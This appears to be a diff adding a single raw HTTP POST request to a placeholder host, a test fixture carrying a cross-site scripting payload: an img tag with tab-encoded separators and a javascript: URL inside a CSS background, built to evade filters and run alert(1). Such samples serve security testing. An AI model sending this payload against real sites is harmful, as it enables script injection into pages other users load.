@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 61
+Connection: close
+
+s=<img%09src=1%09style="background:url(javascript:alert(1))">
